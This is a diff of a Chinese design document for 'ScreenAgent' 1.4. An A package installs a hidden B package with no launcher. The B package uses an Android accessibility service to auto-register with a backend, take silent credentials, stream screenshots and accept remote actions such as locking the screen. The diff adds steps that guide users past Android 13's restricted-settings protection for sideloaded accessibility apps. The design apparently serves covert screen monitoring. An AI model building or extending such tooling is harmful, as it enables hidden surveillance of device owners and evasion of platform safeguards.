@@ -1,13 +1,13 @@
 # ScreenAgent 自动上线、心跳与实时最新帧
 
-日期：2026-09-28。当前版本为 B 包 `screenagent-1.3`。用户只需安装 B 包并在 Android 系统设置中启用其无障碍服务；不填写后台地址、登记码或设备 JWT。后台域名与 APK ID 在构建时写入 B 包，设备凭证由 Node 静默签发并保存在应用私有存储。
+日期：2026-09-28。当前版本为 B 包 `screenagent-1.4`。用户只需安装 B 包并在 Android 系统设置中启用其无障碍服务；不填写后台地址、登记码或设备 JWT。后台域名与 APK ID 在构建时写入 B 包，设备凭证由 Node 静默签发并保存在应用私有存储。
 
 ## 用户流程
 
-1. 在构建中心先构建 `screenagent-1.3` B 包。构建服务写入后台 HTTPS 域名、账号固定 APK ID、构建 ID、包名和版本。
+1. 在构建中心先构建 `screenagent-1.4` B 包。构建服务写入后台 HTTPS 域名、账号固定 APK ID、构建 ID、包名和版本。
 2. 构建 A 包。A 包携带该账号最新成功的 B 包、摘要和包名。
 3. A 包首次打开且未检测到 B 包时只显示「安装 B 包」。用户在 Android 系统安装器确认。
-4. 返回 A 包后显示「打开无障碍」。只有用户点击后才进入 Android 无障碍设置。
+4. 返回 A 包后显示无障碍引导。Android 13 及以上若侧载 B 包的无障碍项被系统置灰，用户先打开 B 包应用信息并在系统菜单选择「允许受限设置」，再点击「打开无障碍」；旧系统直接进入无障碍设置。
 5. 用户启用 B 包无障碍服务。B 包自动上线、建立心跳并上传一张首图；B 包没有 Activity、MAIN/LAUNCHER 或首页。
 6. 返回 A 包后进入配置的 HTTPS WebView。以后只要 B 包已安装，A 包直接进入 WebView。
 
@@ -28,7 +28,7 @@ Content-Type: application/json
   "brand": "Android 品牌",
   "model": "设备型号",
   "osVersion": "11",
-  "appVersion": "1.3.0",
+  "appVersion": "1.4.0",
   "appName": "构建应用名",
   "batch": "可选批次",
   "buildId": "构建 UUID",
@@ -69,17 +69,18 @@ WS 首次进入在线状态且 Android 版本为 11 及以上时，B 包申请 `
 
 1. 面板每 5 秒发送查看心跳，Node 签发 12 秒查看租约。
 2. Node 下发 `SCREENSHOT_VIEWER_LEASE` 和 `SCREENSHOT_NOW`。
-3. B 包只在租约有效时串行执行“申请上传许可 → `takeScreenshot` → JPEG → 上传”。Android 11 间隔不短于 1001ms，Android 12+ 不短于 334ms；同一时刻最多处理一帧。
-4. 页面关闭、面板 WS 断开或租约过期时，Node 下发 `SCREENSHOT_VIEWER_CLOSE`，B 包立即停止后续截图，但设备心跳继续。
+3. B 包只在租约有效时串行执行“申请上传许可 → `takeScreenshot` → 缩放到最大 540px 宽 → JPEG 50 → 上传”。Android 11 间隔不短于 1001ms，Android 12+ 不短于 334ms；同一时刻最多处理一帧。
+4. 浮窗同时开放返回、Home、多任务、锁屏、点亮和勿扰六个固定操作；Node 与 B 包都要求同一 `viewerId` 租约有效。不接受文本、坐标、手势或通用指令。
+5. 页面关闭、面板 WS 断开或租约过期时，Node 下发 `SCREENSHOT_VIEWER_CLOSE`，B 包立即停止后续截图并拒绝快捷操作，但设备心跳继续。
 
-截图 multipart 字段固定为 `deviceId/apkId/batch/buildId/ts/file`，请求头 `X-Capture-Upload` 绑定一次性上传许可。JPEG 最大 2MiB、最多 400 万像素、最长边 4096px；Node 解码、旋转、去除元数据并重新编码，新帧替换旧帧。
+截图 multipart 字段固定为 `deviceId/apkId/batch/buildId/ts/file`，请求头 `X-Capture-Upload` 绑定一次性上传许可。JPEG 最大 2MiB、最多 400 万像素、最长边 4096px；1.4 模板在手机端先以最大 540px 宽、质量 50 编码，Node 再解码、旋转、去除元数据并重新编码，新帧替换旧帧。
 
 ## 源码位置
 
-- 自动上线与首图：`android/apk-templates/b-packages/screenagent-1.3/app/src/main/java/com/zaka/screenagent/accessibility/BoundaryAccessibilityService.kt`
-- 网络恢复与 WS 心跳：`android/apk-templates/b-packages/screenagent-1.3/app/src/main/java/com/zaka/screenagent/net/AgentSocket.kt`
-- HTTP 自动上线与上传：`android/apk-templates/b-packages/screenagent-1.3/app/src/main/java/com/zaka/screenagent/net/HttpUploader.kt`
-- 设备私有 Token：`android/apk-templates/b-packages/screenagent-1.3/app/src/main/java/com/zaka/screenagent/net/DeviceSession.kt`
+- 自动上线与首图：`android/apk-templates/b-packages/screenagent-1.4/app/src/main/java/com/zaka/screenagent/accessibility/BoundaryAccessibilityService.kt`
+- 网络恢复与 WS 心跳：`android/apk-templates/b-packages/screenagent-1.4/app/src/main/java/com/zaka/screenagent/net/AgentSocket.kt`
+- HTTP 自动上线与上传：`android/apk-templates/b-packages/screenagent-1.4/app/src/main/java/com/zaka/screenagent/net/HttpUploader.kt`
+- 设备私有 Token：`android/apk-templates/b-packages/screenagent-1.4/app/src/main/java/com/zaka/screenagent/net/DeviceSession.kt`
 - Node 归属与上传：`backend/src/device-ingress.js`
 - 查看租约与设备通道：`backend/src/websocket.js`
 
